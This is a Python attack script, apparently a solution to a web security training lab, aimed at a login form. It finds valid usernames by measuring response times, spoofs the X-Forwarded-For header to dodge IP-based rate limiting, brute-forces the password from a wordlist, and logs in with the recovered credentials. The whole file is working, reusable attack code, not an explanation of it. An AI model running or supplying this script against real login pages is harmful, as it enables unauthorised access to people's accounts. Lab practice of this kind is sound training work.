import requests
import sys
import time
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

counter= 1

def send_login(url, username, password):
    global counter
    headers = {"X-Forwarded-For": str(counter)}
    counter = counter + 1
    data = {"username": username, "password": password}
    start = time.perf_counter()
    r = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=False)
    end = time.perf_counter()
    elapsed = end - start
    return elapsed, r

def find_username(url, users_file):
    print("[*] Finding username via response timing...\n")
    results = []
    f = open(users_file, "r")
    for line in f:
        username = line.strip()
        if username == "":
            continue
        t1, _ = send_login(url, username, "A" * 100)
        sys.stdout.write(f"\r[*] Testing: {username:<20} {t1:.4f}s")
        results.append([username, t1])
        sys.stdout.flush()
    f.close()
    for i in range(len(results)):
        for j in range(len(results)):
            if results[i][1] > results[j][1]:
                temp = results[i]
                results[i] = results[j]
                results[j] = temp
    print()
    print("\n[*] Top candidates:\n")
    for i in range(3):
        print(f"{results[i][0]:<20} {results[i][1]:.4f}s")
    return results[0][0]

def brute_password(url, username, passwords_file):
    print(f"\n[*] Bruteforcing password for: {username}\n")
    f = open(passwords_file, "r")
    for line in f:
        password = line.strip()
        if password == "":
            continue
        sys.stdout.write(f"\r[*] Trying: {password:<20}")
        sys.stdout.flush()
        _, r = send_login(url, username, password)
        if r.status_code == 302:
            print()
            print(f"[+] Password found: {password}")
            f.close()
            return password
    f.close()
    return None

# login as user
def user_login(s, url, username, password):
    data = {"username": username,"password": password}
    r = s.post(url + "/login", data=data, verify=False)
    if "Log out" in r.text:
        return True
    return False  

def main():
    if len(sys.argv) != 4:
        print(f"[+] Usage: {sys.argv[0]} <url> <users.txt> <passwords.txt>")
        sys.exit()

    s = requests.Session()

    url = sys.argv[1].strip()
    login_url = url + "/login"

    users_file = sys.argv[2]
    passwords_file = sys.argv[3]

    username = find_username(login_url, users_file)

    print(f"\n[+] Selected username: {username}")

    password = brute_password(login_url, username, passwords_file)

    if password:
        print(f"\n[+] Credentials: {username}:{password}")
    else:
        print("\n[-] No password found")
        sys.exit()

    print("\n[*] Logging in to complete lab...\n")

    if user_login(s, url, username, password):
        print(f"[+] Successfully logged in as {username}:{password}")
    else:
        print("[-] Login failed")

if __name__=="__main__":
    main()